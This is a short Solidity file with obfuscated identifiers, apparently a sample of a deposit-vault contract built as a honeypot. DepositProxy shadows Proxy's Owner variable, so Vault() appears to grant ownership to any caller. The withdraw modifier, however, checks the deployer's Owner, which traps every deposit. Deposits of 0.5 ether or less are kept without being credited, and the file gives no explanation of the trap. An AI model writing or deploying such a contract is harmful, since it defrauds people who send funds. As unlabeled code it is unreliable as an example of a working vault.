// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0x103a76 { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0xf48e32(address _0x85531b) public _0x103a76 { Owner = _0x85531b; }
    function _0x8b800e(address _0x762fbc, bytes data) public payable {
        _0x762fbc.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0x560603();
        }
    }

    function _0x560603() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x16710c(uint256 _0x7ea320) public _0x103a76 {
        if (_0x7ea320>0 && Deposits[msg.sender]>=_0x7ea320) {
            msg.sender.transfer(_0x7ea320);
        }
    }
}